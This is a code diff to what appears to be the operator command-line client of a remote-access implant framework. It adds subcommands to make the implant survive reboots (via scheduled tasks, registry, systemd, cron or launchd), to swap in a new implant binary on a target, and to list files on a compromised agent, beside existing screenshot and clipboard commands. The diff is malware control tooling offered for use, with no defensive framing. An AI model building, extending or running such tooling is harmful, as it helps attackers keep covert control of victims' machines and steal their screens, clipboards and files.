@@ -1323,6 +1323,28 @@ def build_parser() -> argparse.ArgumentParser:
     # -- alerts ------------------------------------------------------------
     alerts = sub.add_parser("alerts", help="the alert rules of the server")
 
+    # -- installing and updating ------------------------------------------
+    persist = sub.add_parser("persist", help="install the implant so it survives a reboot")
+    persist.add_argument("agent")
+    persist.add_argument("--method", default="auto",
+                         help="auto, schtasks, registry, systemd, cron or launchd")
+    persist.add_argument("--wait", action="store_true")
+    persist.add_argument("--timeout", type=float, default=120.0)
+
+    update = sub.add_parser("update", help="replace the running implant")
+    update.add_argument("agent")
+    update.add_argument("path", help="the new binary on the target")
+    update.add_argument("--sha256", default="", help="the expected digest of the new binary")
+    update.add_argument("--wait", action="store_true")
+    update.add_argument("--timeout", type=float, default=120.0)
+
+    browse = sub.add_parser("browse", help="list the files under a path on an agent")
+    browse.add_argument("agent")
+    browse.add_argument("path", nargs="?", default=".")
+    browse.add_argument("--max", type=int, default=500)
+    browse.add_argument("--wait", action="store_true")
+    browse.add_argument("--timeout", type=float, default=300.0)
+
     # -- the operator's own desktop ---------------------------------------
     shot = sub.add_parser("screenshot", help="capture the screen of an agent")
     shot.add_argument("agent")
@@ -1832,6 +1854,17 @@ def main(argv: Optional[List[str]] = None) -> int:
                 print(f"{target} ({len(png)} bytes)")
         elif args.cmd == "clipboard":
             run_task_and_wait(client, console, args.agent, "clipboard", {},
+                              args.wait, args.timeout, args.json)
+        elif args.cmd == "persist":
+            run_task_and_wait(client, console, args.agent, "persist",
+                              {"method": args.method}, args.wait, args.timeout, args.json)
+        elif args.cmd == "update":
+            run_task_and_wait(client, console, args.agent, "update",
+                              {"path": args.path, "sha256": args.sha256},
+                              args.wait, args.timeout, args.json)
+        elif args.cmd == "browse":
+            run_task_and_wait(client, console, args.agent, "find",
+                              {"path": args.path, "name": "", "content": "", "max": args.max},
                               args.wait, args.timeout, args.json)
         elif args.cmd == "triage":
             run_task_and_wait(client, console, args.agent, "triage", {"path": args.path},
